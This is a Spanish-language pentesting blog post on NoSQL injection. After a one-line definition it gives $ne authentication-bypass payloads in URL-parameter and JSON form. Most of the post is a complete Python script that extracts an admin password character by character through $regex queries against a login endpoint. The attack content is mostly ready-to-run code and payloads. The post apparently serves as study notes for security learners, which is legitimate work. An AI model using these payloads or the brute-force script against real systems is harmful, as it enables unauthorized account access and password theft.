---
title: "NoSQL Inyection"
author: Tuch0
date: 2023-09-17
categories: [Vectores-de-Ataque]
tags: [NoSQL]
image:
    path: ../../assets/Miniaturas/VectoresDeAtaque/nosql.png
    width: 800
    height: 500
---

#### ¿Qué es?

> Es una amplia clase de sistemas de gestión de bases de datos que difieren del model clásico de SGBDR en aspectos importantes , siendo el más destacado que no usan SQL como lenguaje principal de consultas
{: .prompt-info }

## Ataques básicos

```bash
# Jugamos con el validador "Not Equal"
user[$ne]=admin&password[$ne]=caca
```

```json
// Jugamos trámitando la data en JSON
{
	"user":"admin",
	"password":{
	"$ne":"caca"}
}
```

### Script para dumpear contraseñas con regex

```python
#!/usr/bin/python3

# Importamos las liberias
from pwn import * 
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


# Variables generales
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits


# Core Function
def makeNoSQLI():
    
    # Variables locales
    password = ""

    # Definimos las barras de progreso
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    # Esperamos un tiempo
    time.sleep(2)

    # Definimos segunda barra de progreso
    p2 = log.progress("Password")


    # Definimos la longitud de la contraseña -> ({"username":"admin","password":{"$regex";".{<número>}"}})
    for position in range(1, 24):
        
        # Iteramos por cada caracter
        for character in characters:
            
            # Creamos la data
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)
            
            # Actualizamos primera barra de progreso
            p1.status(post_data)

            # Indicamos el header
            headers = {'Content-Type':'application/json'}
            r = requests.post(login_url, headers=headers, data=post_data)

            # Validamos si el caracter es correcto
            if "Logged in as user" in r.text:
                # Añadimos caracter correcto a la contraseña
                password += character
                
                # Actualizamos la barra de progreso
                p2.status(password)
                #break

if __name__ == '__main__':
    makeNoSQLI()
```